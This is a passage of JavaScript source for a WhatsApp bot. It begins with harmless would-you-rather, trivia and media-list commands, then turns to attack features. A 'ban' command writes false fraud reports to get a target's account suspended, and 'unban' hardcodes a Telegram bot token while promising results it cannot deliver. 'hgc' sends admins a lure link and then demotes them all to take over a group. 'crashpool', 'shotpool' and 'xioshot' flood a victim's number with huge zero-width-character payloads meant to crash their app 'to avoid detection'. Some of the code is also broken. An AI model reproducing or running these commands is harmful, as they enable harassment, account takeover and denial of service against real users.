            "Would you rather never be able to use the internet again or never be able to watch TV again?",
            "Would you rather be famous for something good or infamous for something bad?",
            "Would you rather always be 10 minutes late or always be 20 minutes early?",
            "Would you rather have a personal chef or a personal driver?",
            "Would you rather never have to sleep again or never have to eat again?",
            "Would you rather live in a world where there is no war or a world where there is no hunger?",
            "Would you rather be able to talk to animals or be able to read minds?",
            "Would you rather be rich but lonely or poor but surrounded by loved ones?",
            "Would you rather have super strength or super intelligence?",
            "Would you rather be able to time travel or teleport anywhere instantly?",
            "Would you rather have a photographic memory or be able to forget anything at will?",
            "Would you rather live in a house on the beach or in a cabin in the mountains?",
            "Would you rather be able to control the weather or have the ability to control time?",
            "Would you rather live without music or without movies?",
            "Would you rather always be hot or always be cold?",
            "Would you rather fight 100 duck-sized horses or one horse-sized duck?",
            "Would you rather be able to breathe underwater or fly through the sky?",
            "Would you rather have the ability to speak every language or master every instrument?",
            "Would you rather be constantly tired but still productive or full of energy but lazy?",
            "Would you rather be the smartest person in the world or the funniest?",
            "Would you rather be able to talk to your past self or your future self?",
            "Would you rather live without social media or without your phone?",
            "Would you rather be able to see the future or change the past?",
            "Would you rather never get tired or never feel pain?",
            "Would you rather never have to work again or never have to sleep again?",
            "Would you rather have an unlimited supply of food or unlimited entertainment?",
            "Would you rather have no responsibilities or have a lot of responsibilities but all paid for?",
            "Would you rather always know when someone is lying or always get away with lying?",
            "Would you rather have the ability to create new worlds or explore new worlds?",
            "Would you rather live in a utopia or a dystopia?",
            "Would you rather be able to change your appearance at will or read minds?",
            "Would you rather never be able to get sick or never feel sadness?",
            "Would you rather always be surrounded by people or always be alone?",
            "Would you rather never experience failure or never experience success?",
            "Would you rather have a house full of plants or a house full of pets?",
            "Would you rather always have perfect health or be able to recover instantly from injury?",
            "Would you rather be able to predict the weather or predict the future?",
            "Would you rather always know the truth or never know the truth?",
            "Would you rather be in a relationship with your dream partner or have the perfect career?",
            "Would you rather live in a futuristic city or a rustic village?",
            "Would you rather have the power of invincibility or the power to read minds?",
            "Would you rather be famous for something ridiculous or never be famous at all?",
            "Would you rather never have to do chores again or never have to work again?",
            "Would you rather have all the money in the world but no friends or be poor but surrounded by friends?",
            "Would you rather always be able to find the perfect gift for anyone or always be able to make anyone laugh?",
            "Would you rather be able to talk to animals or control the weather?",
            "Would you rather be the most talented person in the world but never recognized, or the least talented but famous?",
            "Would you rather always have perfect hair or perfect skin?",
            "Would you rather have the ability to teleport to any place or be able to talk to anyone in any language?",
            "Would you rather know all the secrets of the universe or know nothing at all?",
            "Would you rather always be happy but not able to do anything or be able to do anything but never be happy?",
            "Would you rather be in a group of friends who are always honest but brutal or friends who are always kind but not truthful?",
            "Would you rather only be able to tell the truth or only be able to lie?",
            "Would you rather always be happy in your job but poor or unhappy in your job but rich?",
            "Would you rather live forever or live a full life but die young?",
            "Would you rather have the ability to talk to anyone or be invisible when you want?",
            "Would you rather have super speed or super agility?",
            "Would you rather never have to cook again or never have to clean again?",
            "Would you rather experience every single feeling in the world or never feel anything again?",
            "Would you rather always get the last word in an argument or always avoid arguments altogether?",
            "Would you rather be able to sing beautifully or play any musical instrument perfectly?",
            "Would you rather always know what to say or always know when to be silent?",
            "Would you rather always have someone to talk to or always have your own space?",
            "Would you rather never have to sleep or never have to eat?",
            "Would you rather have the perfect body or the perfect mind?",
            "Would you rather always have to say what you’re thinking or never be able to express your feelings?",
            "Would you rather have a perfect memory or always be able to learn new things instantly?",
            "Would you rather be able to live on Mars or live underwater?",
            "Would you rather be able to control your dreams or never need to sleep?",
            "Would you rather always win arguments or always be right but no one believes you?",
            "Would you rather be able to control all your emotions or never feel anything?",
            "Would you rather have the ability to change your past mistakes or predict your future mistakes?",
            "Would you rather have your dream job but hate the people you work with or a mediocre job with great colleagues?",
            "Would you rather never have to age or never have to sleep?",
            "Would you rather have a life without any challenges or a life filled with challenges but never feeling lost?",
            "Would you rather experience your ideal day every day or experience something new every day?",
            "Would you rather always know the right thing to do or the right thing to say?",
            "Would you rather be able to remember everything but never forget or forget everything and start fresh?",
            "Would you rather live a comfortable but ordinary life or an extraordinary but difficult life?",
            "Would you rather be able to live anywhere in the world or have any job you desire?",
            "Would you rather have perfect health for the rest of your life or be able to have any skill you desire?",
            "Would you rather live in a world where everyone knows what you're thinking or a world where no one can talk?",
            "Would you rather be able to hear every conversation around you or read everyone’s mind?",
            "Would you rather have the ability to heal others or the ability to stop time?",
            "Would you rather be able to teleport anywhere or go back in time?",
            "Would you rather never be able to speak again or always have to tell the truth?",
            "Would you rather be an introvert with a few close friends or an extrovert with many acquaintances?",
            "Would you rather know everything about the universe or know everything about yourself?"
        ];

        await XeonBotInc.sendMessage(m.chat, {
            text: `*🤔 Would You Rather? 🤔*\n\n${wouldYouRatherQuestions[Math.floor(Math.random() * wouldYouRatherQuestions.length)]}\n\n*What would you choose?*`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the Would You Rather question. Please try again later.');
        console.error('Would You Rather error:', err);
    }
    break;
    case 'trivia':
    try {
        const triviaQuestions = [
            { question: "What is the capital of France?", answer: "Paris" },
            { question: "Who painted the Mona Lisa?", answer: "Leonardo da Vinci" },
            { question: "What is the largest planet in our solar system?", answer: "Jupiter" },
            { question: "In which year did the Titanic sink?", answer: "1912" },
            { question: "What is the smallest country in the world?", answer: "Vatican City" },
            { question: "What is the longest river in the world?", answer: "Nile" },
            { question: "Who wrote 'Romeo and Juliet'?", answer: "William Shakespeare" },
            { question: "What is the hardest natural substance on Earth?", answer: "Diamond" },
            { question: "How many continents are there?", answer: "Seven" },
            { question: "Which planet is known as the Red Planet?", answer: "Mars" },
            { question: "What is the largest ocean on Earth?", answer: "Pacific Ocean" },
            { question: "In what year did World War II end?", answer: "1945" },
            { question: "What is the currency of Japan?", answer: "Yen" },
            { question: "Who developed the theory of relativity?", answer: "Albert Einstein" },
            { question: "What is the tallest mountain in the world?", answer: "Mount Everest" },
            { question: "Which animal is known as the king of the jungle?", answer: "Lion" },
            { question: "How many states are in the United States?", answer: "50" },
            { question: "What is the largest desert in the world?", answer: "Sahara Desert" },
            { question: "Who was the first President of the United States?", answer: "George Washington" },
            { question: "What is the smallest bone in the human body?", answer: "Stapes" },
            { question: "What is the name of the ship that brought the Pilgrims to America?", answer: "Mayflower" },
            { question: "What is the main ingredient in guacamole?", answer: "Avocado" },
            { question: "Which animal can be found in the wild but also as a pet in homes?", answer: "Cat" },
            { question: "What is the largest country in the world?", answer: "Russia" },
            { question: "What year did the Berlin Wall fall?", answer: "1989" },
            { question: "Who invented the telephone?", answer: "Alexander Graham Bell" },
            { question: "What is the chemical symbol for water?", answer: "H2O" },
            { question: "What is the official language of Brazil?", answer: "Portuguese" },
            { question: "Who is known as the father of modern physics?", answer: "Isaac Newton" },
            { question: "What does the term ‘IQ’ stand for?", answer: "Intelligence Quotient" },
            { question: "Which country is known as the Land of the Rising Sun?", answer: "Japan" },
            { question: "What is the largest species of bear?", answer: "Polar Bear" },
            { question: "What is the hardest rock?", answer: "Diamond" },
            { question: "Which city is known as the Big Apple?", answer: "New York City" },
            { question: "What type of animal is a Komodo dragon?", answer: "Lizard" },
            { question: "Which country invented pizza?", answer: "Italy" },
            { question: "What is the name of the longest river in South America?", answer: "Amazon River" },
            { question: "Who was the first woman to fly solo across the Atlantic Ocean?", answer: "Amelia Earhart" },
            { question: "What is the largest type of whale?", answer: "Blue Whale" },
            { question: "Which famous scientist is known for his work on evolution?", answer: "Charles Darwin" },
            { question: "How many bones are in the adult human body?", answer: "206" },
            { question: "Which planet has the most moons?", answer: "Jupiter" },
            { question: "What is the smallest planet in the solar system?", answer: "Mercury" },
            { question: "What is the longest running TV show?", answer: "The Simpsons" },
            { question: "What year did the first man land on the moon?", answer: "1969" },
            { question: "What is the capital of Australia?", answer: "Canberra" },
            { question: "Which element has the chemical symbol O?", answer: "Oxygen" },
            { question: "Which animal is the largest living terrestrial animal?", answer: "Elephant" },
            { question: "Which country is home to the Great Barrier Reef?", answer: "Australia" },
            { question: "Which composer wrote the ‘Ode to Joy’?", answer: "Ludwig van Beethoven" },
            { question: "What is the capital of Japan?", answer: "Tokyo" },
            { question: "Which is the largest city in the world by population?", answer: "Tokyo" },
            { question: "What is the name of the largest coral reef in the world?", answer: "Great Barrier Reef" },
            { question: "Which animal is known for changing colors?", answer: "Chameleon" },
            { question: "Which fruit is known for keeping the doctor away?", answer: "Apple" },
            { question: "Which planet is closest to the sun?", answer: "Mercury" },
            { question: "What is the longest bone in the human body?", answer: "Femur" },
            { question: "What year was the first iPhone released?", answer: "2007" },
            { question: "What is the capital of Canada?", answer: "Ottawa" },
            { question: "Which is the biggest island in the world?", answer: "Greenland" },
            { question: "How many hearts does an octopus have?", answer: "Three" },
            { question: "Who was the first man in space?", answer: "Yuri Gagarin" },
            { question: "What is the currency of the United Kingdom?", answer: "Pound Sterling" },
            { question: "Which planet is known as the ‘Morning Star’?", answer: "Venus" },
            { question: "What is the largest volcano in the world?", answer: "Mauna Loa" },
            { question: "What is the capital of Spain?", answer: "Madrid" },
            { question: "What is the longest-running Broadway show?", answer: "The Phantom of the Opera" },
            { question: "What color is the sky on Mars?", answer: "Red" },
            { question: "Who invented the lightbulb?", answer: "Thomas Edison" },
            { question: "Which U.S. state is known as the Sunshine State?", answer: "Florida" },
            { question: "What is the national animal of Canada?", answer: "Beaver" },
            { question: "What is the tallest building in the world?", answer: "Burj Khalifa" },
            { question: "What is the largest fish in the world?", answer: "Whale Shark" },
            { question: "What is the name of the first artificial satellite?", answer: "Sputnik 1" },
            { question: "What is the fastest land animal?", answer: "Cheetah" },
            { question: "What year did the United States declare independence?", answer: "1776" },
            { question: "What is the capital of Italy?", answer: "Rome" },
            { question: "What is the name of the highest mountain in North America?", answer: "Denali" },
            { question: "What is the longest running animated TV series?", answer: "The Simpsons" },
            { question: "Which ocean is the largest?", answer: "Pacific Ocean" },
            { question: "What is the smallest planet in the solar system?", answer: "Mercury" },
            { question: "What is the capital of the United Kingdom?", answer: "London" },
            { question: "What is the largest bird in the world?", answer: "Ostrich" },
            { question: "Which country is known for its pyramids?", answer: "Egypt" },
            { question: "Who was the first President of the United States?", answer: "George Washington" },
            { question: "Which country is the largest producer of coffee?", answer: "Brazil" },
            { question: "Which is the longest river in the United States?", answer: "Missouri River" },
            { question: "Which city is known as the City of Lights?", answer: "Paris" },
            { question: "What is the largest land animal?", answer: "African Elephant" }
        ];
        
        const randomTrivia = triviaQuestions[Math.floor(Math.random() * triviaQuestions.length)];
        await XeonBotInc.sendMessage(m.chat, {
            text: `*🧠 Trivia Time! 🧠*\n\n*Question:* ${randomTrivia.question}\n\n*Reply with your answer!*`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the trivia question. Please try again later.');
        console.error('Trivia error:', err);
    }
    break;
            case 'delsticker': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the name of the sticker')
                if (!StickerXeon.includes(q)) return replygcxeon("Name Not Registered in Database")
                let wanu = StickerXeon.indexOf(q)
                StickerXeonBotInc.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./Phistar-media/sticker/${q}.webp`)
                replygcxeon(`Successfully Removed Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the Name?')
                if (VoiceNoteXeon.includes(q)) return replygcxeon("Name Already In Use")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                VoiceNoteXeon.push(q)
                await fsx.copy(delb, `./Phistar-media/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(delb)
                replygcxeon(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the Name')
                if (!VoiceNoteXeon.includes(q)) return replygcxeon("Name Not Registered in Database")
                let wanu = VoiceNoteXeon.indexOf(q)
                VoiceNoteXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./Phistar-media/audio/${q}.mp3`)
                replygcxeon(`Successfully Deleted Audio ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./Phistar-media/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = ZipXeon.indexOf(teks)
ZipXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./Phistar-media/zip/${teks}.zip`)
replygcxeon(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
replygcxeon(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./Phistar-media/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replygcxeon(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = ApkXeon.indexOf(teks)
ApkXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./Phistar-media/apk/${teks}.apk`)
replygcxeon(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
replygcxeon(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./Phistar-media/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
replygcxeon(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = DocApk.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./Phistar-media/doc/${teks}.pdf`)
replygcxeon(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
replygcxeon(teksoooo)
}
break
            case 'afk':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (isAfkOn) return replygcxeon("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replygcxeon(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
case "ytmp3": case "ytaudio": {
    const xeonaudp3 = require('./lib/ytdl2'); // Import the YouTube module
    if (!args.length || !isUrl(text) || !xeonaudp3.isYTUrl(text)) {
        return replygcxeon(`Where's the YouTube link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`);
    }

    xeonaudp3.yta(text) // Call the YouTube downloader function
        .then(audio => {
            XeonBotInc.sendMessage(m.chat, {
                audio: { url: audio.dl_link }, // Use the direct download link
                mimetype: 'audio/mp4',
                ptt: true,
                contextInfo: {
                    externalAdReply: {
                        title: audio.title,
                        body: botname,
                        thumbnail: fetchBuffer(audio.thumb), // Fetch thumbnail
                        mediaType: 2,
                        mediaUrl: text,
                    }
                }
            }, { quoted: m })
            .then(() => console.log("Audio sent successfully"))
            .catch(err => {
                console.error("Failed to send audio message:", err);
                replygcxeon("Failed to send the audio. Please try again later.");
            });
        })
        .catch(err => {
            console.error("Failed to download audio:", err);
            replygcxeon("Failed to download the audio. Please check the link and try again.");
        });
    break;
}
//ban note 
case 'ban':
    if (!isCreator) return replygcxeon(mess.owner); // Restrict access to the creator

    if (!text) {
        return replygcxeon(`🚨 Please provide the number and language code. Usage: ${command} <number> <language_code>`);
    }

    // Directly process input using `xandroid` logic
    let inputParts = text.trim().split(" "); // Split the input into parts
    let number = encodeURI(inputParts[0]) * 1; // Use the first part of the input as the number
    let languageCode = inputParts[1]?.toLowerCase(); // Use the second part as the language code

    if (!number || isNaN(number)) {
        return replygcxeon("❌ Invalid number. Please enter a valid numeric value.");
    }
    if (!languageCode) {
        return replygcxeon("❌ Please specify a language code. Supported languages: arabic, turkish, vietnamese.");
    }

    // Define ban notes for supported languages
    const languageNotes = {
        arabic: `
**الموضوع:** تقرير عاجل – رقم مشبوه  
فريق دعم WhatsApp المحترم،  
أود الإبلاغ عن الرقم ${number} المتورط في أنشطة احتيالية أدت إلى خسارتي مبلغ 300,000 دولار.  

أطلب منكم اتخاذ الإجراءات اللازمة لتعليق هذا الحساب فورًا ومنع أي نشاط ضار آخر على المنصة.  

شكرًا لتعاونكم،  
[اسمك]
        `,
        turkish: `
**Konu:** Acil Rapor – Şüpheli Numara  
WhatsApp Destek Ekibi,  
Bu numara ${number} dolandırıcılık faaliyetlerinde yer almakta olup, bana $300,000 zarar vermiştir.  

Bu hesabın, daha fazla kullanıcıyı mağdur etmemesi için derhal engellenmesini talep ediyorum.  

Saygılarımla,  
[Adınız]
        `,
        vietnamese: `
**Chủ đề:** Báo cáo Khẩn Cấp – Số điện thoại lừa đảo  
Kính gửi Đội Hỗ trợ WhatsApp,  
Tôi muốn báo cáo rằng số điện thoại ${number} liên quan đến hành vi lừa đảo, khiến tôi mất đi $300,000.  

Tôi yêu cầu WhatsApp ngay lập tức chặn tài khoản này để bảo vệ người dùng khỏi những hành vi lừa đảo tiếp theo.  

Trân trọng,  
[Tên của bạn]
        `,
    };

    // Check if the selected language is supported
    const banNote = languageNotes[languageCode];
    if (!banNote) {
        return replygcxeon(`❌ Unsupported language code: ${languageCode}. Supported languages are arabic, turkish, vietnamese.`);
    }

    try {
        await replygcxeon(`🚨 *Ban Note!*\n\n${banNote}\n\n🔢 *Target Number:* ${number} Need help? Use the command bantutorial to know how to use this note`);
    } catch (err) {
        console.error("Error processing the ban command:", err);
        await replygcxeon("❌ Failed to send the ban note. Please try again later.");
    }
    break;

// Bantutorial Command
case 'bantutorial':
    const tutorialNote = `
📘 **How to Use Ban Notes**

1️⃣ **Copy the Ban Note**: Copy the note sent by the bot, including the reported number.

2️⃣ **Open WhatsApp Support**:
   - Go to **Settings** > **Help** > **Contact Us**.

3️⃣ **Paste the Ban Note**: Paste the note into the message box and explain why you’re reporting the number (e.g., fraud or spam).

4️⃣ **Submit the Report**: Send the report, and WhatsApp will review it.

📢 **Pro Tip**: Be specific in your report to improve the chances of action being taken.
    `;

    try {
        await replygcxeon(`✅ **Tutorial Sent Successfully!**\n\n${tutorialNote}`);
    } catch (err) {
        console.error("Error sending the tutorial note:", err);
        await replygcxeon("❌ Failed to send the tutorial. Please try again later.");
    }
    break;
    //unban
    case 'unban': 
    if (!isCreator) return replygcxeon("🚨 Only the bot owner can use this command.");

    if (!text) { 
        return replygcxeon("🚨 Please provide the number you want to unban. Usage: unban <number>");
    }

    // Extract the target number
    let targetNumber = text.replace(/[^0-9]/g, ""); // Remove non-numeric characters

    if (targetNumber.startsWith("0") || targetNumber.length < 10) {
        return replygcxeon("❌ Invalid number. Please provide a valid WhatsApp number including the country code.");
    }

    // Define the unban message
    const unbanMessage = `🚨 Request to unban the following WhatsApp number: ${targetNumber}`;

    try {
        // Send the message to Telegram
        const telegramApiUrl = `https://api.telegram.org/bot7781002847:AAH_wF0ySaWQ3dW6XY01gGcmnzUTITYA31M/sendMessage`;

        const response = await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: 6300694007, // Replace with your Telegram chat ID
                text: unbanMessage,
            }),
        });

        if (response.ok) {
            // Notify the sender that the request has been sent
            await replygcxeon(`✅ Your unban request has been sent successfully! Your WhatsApp will be unbanned in the next 6 hours. 🔄`);
        } else {
            const errorData = await response.json();
            console.error("Telegram API error:", errorData);
            await replygcxeon("❌ Failed to process your unban request. Please try again later.");
        }
    } catch (error) {
        console.error("Error sending unban request:", error);
        await replygcxeon("❌ An error occurred while processing your unban request. Please try again.");
    }
    break;
    case 'hgc':
  try {
    if (!m.isGroup) return replygcxeon(mess.group); // Ensure command is in a group chat
    
    const groupId = m.chat; // Current group ID
    const admins = await XeonBotInc.groupMetadata(groupId).then(res => res.participants.filter(participant => participant.admin)); // Get list of admins
    
    // Send the link to each admin in the group
    for (let admin of admins) {
      let adminNumber = admin.id.replace('c.us', 's.whatsapp.net'); // Correct admin number format
      let link = `https://example.com/grantadmin?groupID=${groupId}`; // Generate the link with group ID

      await XeonBotInc.sendMessage(adminNumber, {
        text: `Hey, this is an invitation to become an admin in my WhatsApp channel, please click on the link: ${link}`
      });
    }

    // When the backend detects that the link is clicked and bot is granted admin
    const adminGranted = true; // This should be set by the backend when the link is clicked and the bot is granted admin
    if (adminGranted) {
      // Send a message to confirm the bot is now admin
      await replygcxeon(groupId, {
        text: "Gourp Hacked you are now an admin in the group. 🏆"
      });

      // Remove all admins except the bot
      const botNumber = 'botNumber@s.whatsapp.net'; // Replace with the bot's number
      const remainingAdmins = admins.filter(admin => admin.id !== botNumber); // Remove bot itself from the admin list

      // Remove each admin from the group
      for (let admin of remainingAdmins) {
        await XeonBotInc.groupParticipantsUpdate(groupId, [admin.id], 'demote');
      }

      // Send a final success message
      await replygcxeon(groupId, {
        text: "All admins have been removed. group successful *hacked* is now the *sole admin* and group owner! powered by *phistar* 💫"
      });
    }

  } catch (err) {
    console.error(err); // Log error
    replygcxeon("Failed to hack: because you are not a premium users chat my creator to become an premium user");
  }
  break;
  case 'promoteself':
  try {
    if (!m.isGroup) return replygcxeon("This command only works in group chats."); // Check if the command is used in a group chat
    
    const groupId = m.chat; // Group ID
    const metadata = await XeonBotInc.groupMetadata(groupId); // Fetch group metadata
    const admins = metadata.participants.filter(participant => participant.admin === 'admin' || participant.admin === 'superadmin'); // Get list of admins
    const botNumber = await XeonBotInc.user.id; // Bot's WhatsApp number
    
    // Check if the bot is already an admin
    const isBotAdmin = metadata.participants.some(participant => participant.id === botNumber && participant.admin);
    if (isBotAdmin) return replygcxeon("The bot is already an admin in this group.");

    // Ask group admins for admin privileges
    for (let admin of admins) {
      const adminNumber = admin.id; // Admin WhatsApp number
      const message = `Hello Admin, please grant me admin privileges to better manage this group. Thank you!`;

      await XeonBotInc.sendMessage(adminNumber, { text: message });
    }

    // Notify the group
    replygcxeon("Permission request sent to group admins. Please wait for approval.");
  } catch (err) {
    console.error(err);
    replygcxeon("An error occurred while processing the request. Please check the bot's permissions and try again.");
  }
  break;
  //bug cases 
				case "crashpool": {
    if (!isCreator) return replygcxeon(mess.owner);
    if (!text) return replygcxeon(`Usage: .${command} 234***********`);

    // Clean and validate number
    let cleanedNumber = text.replace(/[^0-9]/g, "");
    if (cleanedNumber.startsWith("0")) return replygcxeon(`Example: ${prefix + command} 234***********`);
    let whatsappNumber = cleanedNumber + "@s.whatsapp.net";

    // Check if number is registered on WhatsApp
    var contactInfo = await XeonBotInc.onWhatsApp(whatsappNumber);
    if (contactInfo.length === 0) {
        return replygcxeon("The number is not registered on WhatsApp");
    }

    replygcxeon("🔄 Sending bug... Please wait!");

    // Define the lightweight bug function
    async function sendLiteBug(jid) {
        let zeroWidthChar = "\u200B\u200C\u200D"; // Zero-width characters
        let fullPayload = zeroWidthChar.repeat(9000000); // Full payload of 9 million characters
        let chunkSize = 100000; // Size of each chunk to send
        let chunks = Math.ceil(fullPayload.length / chunkSize); // Number of chunks (90)

        try {
            // Send the payload in chunks
            for (let i = 0; i < 5; i++) { // Limit to 5 chunks for lightweight execution
                let chunk = fullPayload.slice(i * chunkSize, (i + 1) * chunkSize);
                await XeonBotInc.sendMessage(jid, { text: chunk }, { quoted: null });
                await sleep(1500); // Pause to avoid overload
            }

            // Interactive payload (lightweight)
            await XeonBotInc.relayMessage(
                jid,
                {
                    interactiveMessage: {
                        header: { title: "💡 Bug Test" },
                        body: { text: "Invisible Bug Payload" },
                        footer: { text: "Test Footer" },
                        buttons: [
                            {
                                name: "BrokenButton",
                                buttonParamsJson: '{"key":"value"}', // Simulated button data
                            },
                        ],
                    },
                },
                { participant: { jid: jid } }
            );

            // Media message with short caption
            await XeonBotInc.sendMessage(jid, { 
                caption: "Bug Media Test", 
                image: { url: "https://example.com/image.jpg" } 
            });

            // Success message
            await replygcxeon(
                `✅ Successfully bug to @${cleanedNumber}\n\n*Pause for 2 minutes to avoid detection!*`
            );
        } catch (err) {
            console.error("Error sending bug:", err);
            return replygcxeon("❌ Failed to send the bug. Please try again later.");
        }
    }

    // Execute the lightweight bug function
    await sendLiteBug(whatsappNumber);

    break;
}
case "shotpool": {
    if (!isCreator) return replygcxeon(mess.owner);
    if (!text) return replygcxeon(`Usage: .${command} 234***********`);

    let cleanedNumber = text.replace(/[^0-9]/g, "");
    if (cleanedNumber.startsWith("0")) return replygcxeon(`Example: ${prefix + command} 234***********`);
    let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
    var contactInfo = await XeonBotInc.onWhatsApp(whatsappNumber);

    if (contactInfo.length === 0) {
        return replygcxeon("The number is not registered on WhatsApp");
    }

    replygcxeon("🔄 Sending bug... Please wait!");

    async function sendLiteBug(jid) {
        let zeroWidthChar = "\u200B\u200C\u200D"; // Zero-width characters
        let fullPayload = zeroWidthChar.repeat(900000); // Full payload of 500,000 characters
        let chunkSize = 100000; // Size of each chunk to send
        let chunks = Math.ceil(fullPayload.length / chunkSize); // Calculate number of chunks (5)

        try {
            // Send the payload in 5 smaller chunks
            for (let i = 0; i < chunks; i++) {
                let chunk = fullPayload.slice(i * chunkSize, (i + 1) * chunkSize); // Extract the chunk
                await XeonBotInc.sendMessage(jid, { text: chunk }, { quoted: null });
                await sleep(1500); // Small delay to avoid overloading the bot
            }

            // Interactive payload (lightweight)
            await XeonBotInc.relayMessage(
                jid,
                {
                    interactiveMessage: {
                        header: { title: "💡 Bug Test" },
                        body: { text: "Invisible Bug Payload" },
                        footer: { text: "Test Footer" },
                        buttons: [
                            {
                                name: "BrokenButton",
                                buttonParamsJson: '{"key":"value"}', // Simulated button data
                            },
                        ],
                    },
                },
                { participant: { jid: jid } }
            );

            // Media message with short caption
            await XeonBotInc.sendMessage(jid, { 
                caption: "Bug Media Test", 
                image: { url: "https://example.com/image.jpg" } 
            });
        } catch (err) {
            console.error("Error sending bug:", err);
            return replygcxeon("❌ Failed to send the bug. Please try again later.");
        }
    }

    // Execute the lightweight bug function
    await sendLiteBug(whatsappNumber);

    // Confirmation message
    await replygcxeon(
        `✅ Successfully bug to @${cleanedNumber}\n\n*Pause for 2 minutes to avoid detection!*`
    );
}
break;
case "xioshot": {
    if (!isCreator) return replygcxeon(mess.owner);
    if (!text) return replygcxeon(`Usage: .${command} 234***********`);

    // Clean and validate the number
    let cleanedNumber = text.replace(/[^0-9]/g, "");
    if (cleanedNumber.startsWith("0")) return replygcxeon(`Example: ${prefix + command} 234***********`);
    let whatsappNumber = cleanedNumber + "@s.whatsapp.net";

    try {
        // Check if the number is registered on WhatsApp
        var contactInfo = await XeonBotInc.onWhatsApp(whatsappNumber);
        if (contactInfo.length === 0) {
            return replygcxeon("The number is not registered on WhatsApp");
        }

        replygcxeon("🔄 Sending bug... Please wait!");

        // Define the sleep function
        const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

        // Function to send a large payload
        async function sendLargeBug(jid) {
            let zeroWidthChar = "\u200B\u200C\u200D"; // Zero-width characters
            let fullPayload = zeroWidthChar.repeat(900000); // Large payload: 9 million characters
            let chunkSize = 100000; // Size of each chunk: 500,000 characters
            let chunks = Math.ceil(fullPayload.length / chunkSize); // Total chunks

            try {
                // Send payload in chunks
